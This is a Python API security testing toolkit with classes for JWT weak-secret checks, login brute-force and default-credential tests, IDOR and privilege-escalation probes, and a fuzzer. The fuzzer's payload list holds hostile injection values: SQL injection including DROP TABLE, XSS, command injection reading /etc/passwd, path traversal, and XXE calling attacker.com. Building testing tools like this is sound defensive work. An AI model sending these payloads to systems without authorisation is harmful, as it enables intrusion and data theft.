"""
API Security Automation Toolkit
Comprehensive security testing framework for REST APIs
"""

import jwt
import requests
import hashlib
import json
import re
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from base64 import b64decode
import itertools


class JWTAnalyzer:
    """JWT Token Analysis and Security Testing"""
    
    def __init__(self):
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'test',
            'secret123', 'jwt_secret', 'your-256-bit-secret'
        ]
    
    def check_jwt(self, token: str) -> Dict[str, Any]:
        """Comprehensive JWT security analysis"""
        results = {
            'valid': False,
            'decoded_header': None,
            'decoded_payload': None,
            'vulnerabilities': [],
            'recommendations': []
        }
        
        try:
            # Decode without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            results['decoded_header'] = header
            results['decoded_payload'] = payload
            results['valid'] = True
            
            # Security checks
            self._check_algorithm(header, results)
            self._check_expiration(payload, results)
            self._check_sensitive_data(payload, results)
            self._check_weak_secret(token, results)
            
        except jwt.InvalidTokenError as e:
            results['error'] = str(e)
        
        return results
    
    def _check_algorithm(self, header: Dict, results: Dict):
        """Check for algorithm vulnerabilities"""
        alg = header.get('alg', '').upper()
        
        if alg == 'NONE':
            results['vulnerabilities'].append({
                'severity': 'CRITICAL',
                'type': 'Algorithm None Attack',
                'description': 'JWT uses "none" algorithm - no signature verification'
            })
        elif alg in ['HS256', 'HS384', 'HS512']:
            results['recommendations'].append(
                'Consider using asymmetric algorithms (RS256, ES256) for better security'
            )
    
    def _check_expiration(self, payload: Dict, results: Dict):
        """Check token expiration"""
        if 'exp' not in payload:
            results['vulnerabilities'].append({
                'severity': 'HIGH',
                'type': 'Missing Expiration',
                'description': 'Token does not have expiration time (exp claim)'
            })
        else:
            exp = datetime.fromtimestamp(payload['exp'])
            now = datetime.now()
            if exp < now:
                results['vulnerabilities'].append({
                    'severity': 'INFO',
                    'type': 'Expired Token',
                    'description': f'Token expired on {exp}'
                })
            elif (exp - now).days > 7:
                results['recommendations'].append(
                    f'Token validity is {(exp - now).days} days - consider shorter expiration'
                )
    
    def _check_sensitive_data(self, payload: Dict, results: Dict):
        """Check for sensitive data in payload"""
        sensitive_keys = ['password', 'secret', 'credit_card', 'ssn', 'api_key']
        found_sensitive = [key for key in payload.keys() 
                          if any(s in key.lower() for s in sensitive_keys)]
        
        if found_sensitive:
            results['vulnerabilities'].append({
                'severity': 'HIGH',
                'type': 'Sensitive Data Exposure',
                'description': f'Token contains sensitive fields: {", ".join(found_sensitive)}'
            })
    
    def _check_weak_secret(self, token: str, results: Dict):
        """Brute force weak secrets"""
        for secret in self.weak_secrets:
            try:
                jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                results['vulnerabilities'].append({
                    'severity': 'CRITICAL',
                    'type': 'Weak Secret Key',
                    'description': f'Token signed with weak secret: "{secret}"'
                })
                break
            except:
                continue


class AuthenticationTester:
    """Authentication mechanism testing"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_brute_force_protection(self, endpoint: str, 
                                   username: str = 'test@example.com',
                                   max_attempts: int = 10) -> Dict:
        """Test brute force protection mechanisms"""
        results = {
            'protected': False,
            'attempts': 0,
            'locked_out': False,
            'response_times': []
        }
        
        for i in range(max_attempts):
            start_time = datetime.now()
            
            response = self.session.post(
                f"{self.base_url}{endpoint}",
                json={
                    'username': username,
                    'password': f'wrongpass{i}'
                }
            )
            
            response_time = (datetime.now() - start_time).total_seconds()
            results['response_times'].append(response_time)
            results['attempts'] += 1
            
            # Check for rate limiting
            if response.status_code == 429:
                results['protected'] = True
                results['rate_limited_at'] = i + 1
                break
            
            # Check for account lockout
            if 'locked' in response.text.lower() or 'blocked' in response.text.lower():
                results['locked_out'] = True
                results['locked_at'] = i + 1
                break
        
        # Analyze response time increase
        if len(results['response_times']) > 5:
            avg_first = sum(results['response_times'][:3]) / 3
            avg_last = sum(results['response_times'][-3:]) / 3
            if avg_last > avg_first * 2:
                results['progressive_delay'] = True
        
        return results
    
    def test_default_credentials(self, endpoint: str) -> Dict:
        """Test for common default credentials"""
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('root', 'root'),
            ('admin', '123456'),
            ('test', 'test')
        ]
        
        results = {
            'vulnerable': False,
            'working_credentials': []
        }
        
        for username, password in default_creds:
            response = self.session.post(
                f"{self.base_url}{endpoint}",
                json={'username': username, 'password': password}
            )
            
            if response.status_code == 200 and 'token' in response.text.lower():
                results['vulnerable'] = True
                results['working_credentials'].append((username, password))
        
        return results
    
    def test_session_fixation(self, login_endpoint: str) -> Dict:
        """Test for session fixation vulnerabilities"""
        results = {
            'vulnerable': False,
            'session_token_changed': False
        }
        
        # Get initial session token
        initial_response = self.session.get(f"{self.base_url}/")
        initial_token = self.session.cookies.get('session')
        
        # Login
        login_response = self.session.post(
            f"{self.base_url}{login_endpoint}",
            json={'username': 'test', 'password': 'test'}
        )
        
        # Check if session token changed after authentication
        post_login_token = self.session.cookies.get('session')
        
        if initial_token and post_login_token:
            results['session_token_changed'] = (initial_token != post_login_token)
            results['vulnerable'] = not results['session_token_changed']
        
        return results


class AuthorizationTester:
    """Authorization and access control testing"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_idor(self, endpoint_template: str, 
                  valid_token: str,
                  test_range: range = range(1, 100)) -> Dict:
        """
        Test for Insecure Direct Object Reference (IDOR)
        endpoint_template should contain {id} placeholder
        """
        results = {
            'vulnerable': False,
            'accessible_ids': [],
            'total_tested': 0
        }
        
        headers = {'Authorization': f'Bearer {valid_token}'}
        
        for obj_id in test_range:
            endpoint = endpoint_template.format(id=obj_id)
            response = self.session.get(
                f"{self.base_url}{endpoint}",
                headers=headers
            )
            
            results['total_tested'] += 1
            
            if response.status_code == 200:
                results['accessible_ids'].append(obj_id)
        
        if len(results['accessible_ids']) > 1:
            results['vulnerable'] = True
            results['severity'] = 'HIGH'
        
        return results
    
    def test_privilege_escalation(self, 
                                 low_priv_token: str,
                                 admin_endpoint: str) -> Dict:
        """Test for vertical privilege escalation"""
        results = {
            'vulnerable': False,
            'accessible_endpoints': []
        }
        
        admin_endpoints = [
            admin_endpoint,
            f"{admin_endpoint}/users",
            f"{admin_endpoint}/settings",
            f"{admin_endpoint}/delete",
            f"{admin_endpoint}/config"
        ]
        
        headers = {'Authorization': f'Bearer {low_priv_token}'}
        
        for endpoint in admin_endpoints:
            response = self.session.get(
                f"{self.base_url}{endpoint}",
                headers=headers
            )
            
            if response.status_code in [200, 201]:
                results['vulnerable'] = True
                results['accessible_endpoints'].append(endpoint)
        
        return results
    
    def test_horizontal_escalation(self,
                                   user1_token: str,
                                   user2_endpoint: str) -> Dict:
        """Test for horizontal privilege escalation"""
        headers = {'Authorization': f'Bearer {user1_token}'}
        
        response = self.session.get(
            f"{self.base_url}{user2_endpoint}",
            headers=headers
        )
        
        return {
            'vulnerable': response.status_code == 200,
            'status_code': response.status_code,
            'response_length': len(response.content)
        }


class APIFuzzer:
    """API Fuzzing for vulnerability discovery"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load fuzzing payloads"""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin'--",
                "1' UNION SELECT NULL--",
                "1' AND 1=1--",
                "' DROP TABLE users--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'-alert('XSS')-'"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "`id`",
                "$(id)",
                "&& cat /etc/passwd",
                "; ping -c 10 127.0.0.1"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>'
            ]
        }
    
    def fuzz_endpoint(self, endpoint: str, 
                     method: str = 'POST',
                     parameters: List[str] = None) -> Dict:
        """Fuzz an endpoint with various payloads"""
        results = {
            'endpoint': endpoint,
            'vulnerabilities': [],
            'suspicious_responses': []
        }
        
        if not parameters:
            parameters = ['id', 'name', 'query', 'search', 'filter']
        
        for param in parameters:
            for attack_type, payloads in self.payloads.items():
                for payload in payloads:
                    result = self._test_payload(
                        endpoint, method, param, payload, attack_type
                    )
                    
                    if result['suspicious']:
                        results['suspicious_responses'].append(result)
                    
                    if result['vulnerable']:
                        results['vulnerabilities'].append(result)
        
        return results
    
    def _test_payload(self, endpoint: str, method: str, 
                     param: str, payload: str, attack_type: str) -> Dict:
        """Test a single payload"""
        result = {
            'param': param,
            'payload': payload,
            'attack_type': attack_type,
            'vulnerable': False,
            'suspicious': False
        }
        
        try:
            if method.upper() == 'POST':
                response = requests.post(
                    f"{self.base_url}{endpoint}",
                    json={param: payload},
                    timeout=5
                )
            else:
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    params={param: payload},
                    timeout=5
                )
            
            result['status_code'] = response.status_code
            result['response_time'] = response.elapsed.total_seconds()
            
            # Check for vulnerability indicators
            if attack_type == 'sql_injection':
                if any(err in response.text.lower() for err in 
                      ['sql', 'mysql', 'sqlite', 'postgresql', 'syntax error']):
                    result['vulnerable'] = True
            
            elif attack_type == 'xss':
                if payload in response.text:
                    result['vulnerable'] = True
            
            elif attack_type == 'command_injection':
                if any(indicator in response.text for indicator in 
                      ['root:', 'uid=', 'gid=', 'groups=']):
                    result['vulnerable'] = True
            
            elif attack_type == 'path_traversal':
                if 'root:' in response.text or 'passwd' in response.text:
                    result['vulnerable'] = True
            
            # Check for suspicious responses
            if response.status_code == 500 or result['response_time'] > 3:
                result['suspicious'] = True
        
        except Exception as e:
            result['error'] = str(e)
        
        return result


class SecurityReporter:
    """Generate comprehensive security reports"""
    
    def __init__(self):
        self.findings = []
    
    def add_finding(self, category: str, severity: str, 
                   title: str, description: str, 
                   recommendation: str = None):
        """Add a security finding"""
        self.findings.append({
            'timestamp': datetime.now().isoformat(),
            'category': category,
            'severity': severity,
            'title': title,
            'description': description,
            'recommendation': recommendation
        })
    
    def generate_report(self, format: str = 'json') -> str:
        """Generate security assessment report"""
        report = {
            'generated_at': datetime.now().isoformat(),
            'total_findings': len(self.findings),
            'severity_breakdown': self._get_severity_breakdown(),
            'findings': self.findings
        }
        
        if format == 'json':
            return json.dumps(report, indent=2)
        elif format == 'html':
            return self._generate_html_report(report)
        else:
            return self._generate_text_report(report)
    
    def _get_severity_breakdown(self) -> Dict[str, int]:
        """Count findings by severity"""
        breakdown = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        for finding in self.findings:
            severity = finding.get('severity', 'INFO')
            breakdown[severity] = breakdown.get(severity, 0) + 1
        return breakdown
    
    def _generate_html_report(self, report: Dict) -> str:
        """Generate HTML report"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>API Security Assessment Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .critical {{ color: #d32f2f; }}
        .high {{ color: #f57c00; }}
        .medium {{ color: #fbc02d; }}
        .low {{ color: #388e3c; }}
        .finding {{ border: 1px solid #ddd; padding: 15px; margin: 10px 0; }}
    </style>
</head>
<body>
    <h1>API Security Assessment Report</h1>
    <p>Generated: {report['generated_at']}</p>
    <h2>Summary</h2>
    <p>Total Findings: {report['total_findings']}</p>
    <ul>
"""
        for severity, count in report['severity_breakdown'].items():
            html += f"        <li class='{severity.lower()}'>{severity}: {count}</li>\n"
        
        html += "    </ul>\n    <h2>Detailed Findings</h2>\n"
        
        for finding in report['findings']:
            severity_class = finding['severity'].lower()
            html += f"""
    <div class='finding'>
        <h3 class='{severity_class}'>[{finding['severity']}] {finding['title']}</h3>
        <p><strong>Category:</strong> {finding['category']}</p>
        <p><strong>Description:</strong> {finding['description']}</p>
"""
            if finding.get('recommendation'):
                html += f"        <p><strong>Recommendation:</strong> {finding['recommendation']}</p>\n"
            html += "    </div>\n"
        
        html += "</body>\n</html>"
        return html
    
    def _generate_text_report(self, report: Dict) -> str:
        """Generate plain text report"""
        text = "=" * 60 + "\n"
        text += "API SECURITY ASSESSMENT REPORT\n"
        text += "=" * 60 + "\n\n"
        text += f"Generated: {report['generated_at']}\n"
        text += f"Total Findings: {report['total_findings']}\n\n"
        text += "SEVERITY BREAKDOWN:\n"
        
        for severity, count in report['severity_breakdown'].items():
            text += f"  {severity}: {count}\n"
        
        text += "\n" + "=" * 60 + "\n"
        text += "DETAILED FINDINGS\n"
        text += "=" * 60 + "\n\n"
        
        for i, finding in enumerate(report['findings'], 1):
            text += f"{i}. [{finding['severity']}] {finding['title']}\n"
            text += f"   Category: {finding['category']}\n"
            text += f"   Description: {finding['description']}\n"
            if finding.get('recommendation'):
                text += f"   Recommendation: {finding['recommendation']}\n"
            text += "\n"
        
        return text


class RateLimitTester:
    """Test API rate limiting mechanisms"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
    
    def test_rate_limit(self, endpoint: str, 
                       requests_count: int = 100,
                       time_window: int = 60) -> Dict:
        """Test rate limiting on an endpoint"""
        results = {
            'protected': False,
            'requests_sent': 0,
            'requests_blocked': 0,
            'limit_hit_at': None,
            'response_codes': {}
        }
        
        start_time = datetime.now()
        
        for i in range(requests_count):
            response = requests.get(f"{self.base_url}{endpoint}")
            results['requests_sent'] += 1
            
            status = response.status_code
            results['response_codes'][status] = results['response_codes'].get(status, 0) + 1
            
            if status == 429:  # Too Many Requests
                results['protected'] = True
                if not results['limit_hit_at']:
                    results['limit_hit_at'] = i + 1
                results['requests_blocked'] += 1
            
            elapsed = (datetime.now() - start_time).total_seconds()
            if elapsed > time_window:
                break
        
        return results


# Main execution example
if __name__ == "__main__":
    print("API Security Toolkit - Comprehensive Testing Framework")
    print("=" * 60)
    
    # Example: JWT Analysis
    print("\n[+] JWT Analysis Example:")
    jwt_analyzer = JWTAnalyzer()
    sample_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    result = jwt_analyzer.check_jwt(sample_token)
    print(f"Token Valid: {result['valid']}")
    print(f"Vulnerabilities Found: {len(result['vulnerabilities'])}")
    
    print("\n[+] Security testing complete!")
